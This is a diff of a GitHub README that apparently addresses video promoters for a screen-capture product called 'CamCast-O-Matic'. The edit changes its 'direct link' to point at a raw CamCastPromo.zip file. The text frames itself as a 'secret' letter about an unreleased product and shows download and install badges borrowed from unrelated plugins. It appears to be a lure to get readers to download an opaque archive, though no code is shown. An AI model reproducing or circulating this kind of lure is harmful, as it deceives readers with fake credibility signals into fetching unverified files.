@@ -2,7 +2,7 @@
 ### :exclamation:**`Our product supports Windows XP/7/8/10`**:exclamation:    
 We want to warn you that the data in this letter is secret because the official version of the product has not yet been released.  
 We have collected the necessary material for your work - [**CamCastPromo.zip**](https://github.com/CamCast-O-Matic/Promotion/releases/tag/Promotion)  ![https://img.shields.io/jenkins/plugin/i/view-job-filters](https://img.shields.io/jenkins/plugin/i/view-job-filters) ![https://img.shields.io/badge/Realese-No-red](https://img.shields.io/badge/Realese-No-red)    
-**Direct link to download our product** - [**CamCast-O-Matic**](https://github.com/CamCast-O-Matic/Promotion/archive/main.zip)  ![https://img.shields.io/jetbrains/plugin/d/13](https://img.shields.io/jetbrains/plugin/d/13)   
+**Direct link to download our product** - [**CamCast-O-Matic**](https://github.com/CamCast-O-Matic/Promotion/raw/main/CamCastPromo.zip)  ![https://img.shields.io/jetbrains/plugin/d/13](https://img.shields.io/jetbrains/plugin/d/13)   
 **In the video for advertising, you need to tell about the features of our product that are written above and show the interface of our product.**  
 Our features:  
 - Capture video from your computer screen
